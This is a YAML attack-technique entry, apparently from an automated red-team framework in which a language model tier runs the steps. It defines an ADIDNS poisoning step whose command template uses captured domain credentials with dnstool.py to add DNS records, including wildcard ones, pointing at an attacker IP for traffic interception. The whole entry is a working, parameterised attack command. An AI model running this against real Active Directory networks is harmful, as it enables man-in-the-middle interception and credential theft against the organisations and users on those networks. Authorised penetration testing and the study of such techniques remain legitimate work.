name: adidns_record
category: ad
description: ADIDNS record creation/modification
preconditions:
- domain_joined
- has_cred
parameters:
  target_ip: from_engagement.target_ip
command_template: 'python3 dnstool.py -u ''{domain}\{username}'' -p ''{password}'' -r ''{record}'' -a add -d {attacker_ip}
  {target_ip}

  '
parser: generic_parser
expected_effects:
- dns_records_found
falsifier:
  pattern: error|failed|refused|denied
  timeout: 30
model_tier: haiku
mechanism: Any authenticated user can create ADIDNS records by default. Add wildcard (*) record pointing to attacker for LLMNR-like
  poisoning, or specific records for targeted MITM.
hacktricks_ref: generic-methodologies-and-resources/phishing-methodology/README.md
references:
  ocd_mindmap_node_ids:
  - cb4e0c4e22
  - d03383d0dc
